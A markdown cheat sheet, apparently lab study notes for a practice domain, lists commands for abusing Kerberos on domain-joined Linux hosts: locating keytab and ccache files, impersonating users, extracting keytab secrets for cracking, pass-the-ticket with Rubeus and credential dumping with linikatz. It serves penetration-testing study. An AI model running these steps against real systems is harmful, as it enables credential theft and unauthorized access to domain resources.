#### Check if linux machine is domain-joined
```
realm list
```
			OR
```
ps -ef | grep -i "winbind\|sssd"
```

# Search kerberos tickets
#### Find keytab files
```
find / -name *keytab* -ls 2>/dev/null
```
			AND
```
crontab -l
```
#### Find ccache file
```
env | grep -i krb5
```
>CCache file are located in /tmp dir
```
ls -la /tmp
```
#### List keytab file information
```
klist -k -t /opt/specialfiles/carlos.keytab 
```
#### List ticket
```
klist
```

# Impersonate a user
#### Impersonate a user with keytab file
```
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
```
#### List ticket
```
klist
```
#### Connect to SMB share (impersonated user)
```
smbclient //dc01/carlos -k -c ls
```

---
# Extract secrets from keytab file
#### Extract keytab secret
[KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
>Crack hashes after obtaining from keytab file
```
python3 ./keytabextract.py carlos.keytab
```
#### login as carlos with password
```
su - carlos@inlanefreight.htb
```

---
# Abusing keytab ccache file
#### Look for ccache file
>We need read access on the file
```
ls -la /tmp
```
#### Identify group membership
```
id julio@"$domain"
```
#### Importing ccache file into our session
```
export KRB5CCNAME=/root/krb5cc_647401106_I8I133 && klist
```
#### Access shares
```
smbclient //dc01/C$ -k -c ls -no-pass
```

---
# Miscellaneous
#### convert ticket
#kirbitoccache #ccachetokirbi
```
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```
#### import kirbi ticket in windows
```
./rubeus.exe ptt /ticket:julio.kirbi
```
#### linikatz
>It will extract all credentials, including kerberos tickets, from different kerberos implementation such as FreeIPA, SSSD, samba, vintella,etc
```
./linikatz.sh
```